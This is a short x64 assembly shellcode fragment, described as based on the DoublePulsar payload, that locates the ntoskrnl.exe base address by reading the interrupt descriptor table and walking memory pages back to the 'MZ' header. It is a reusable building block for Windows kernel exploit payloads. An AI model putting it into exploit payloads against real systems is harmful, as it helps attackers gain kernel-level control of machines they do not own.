;-----------------------------------------------------------------------------;
; Author: Sean Dillon (@zerosum0x0)
; Architecture: x64
; Based on Equation Group DoublePulsar shellcode
; Clobbers: RAX, RSI
; RAX will be set to the base address of ntoskrnl.exe MZ header
;-----------------------------------------------------------------------------;

  mov rax, qword [gs:0x38]    ; get IdtBase of KPCR
  mov rax, qword [rax+0x4]    ; get ISR address
  shr rax, 0xc                ; strip to page size
  shl rax, 0xc

_walk_page:
  sub rax, 0x1000             ; walk along page size
  mov rsi, qword [rax]
  cmp si, 0x5a4d              ; 'MZ' header
  jne _walk_page
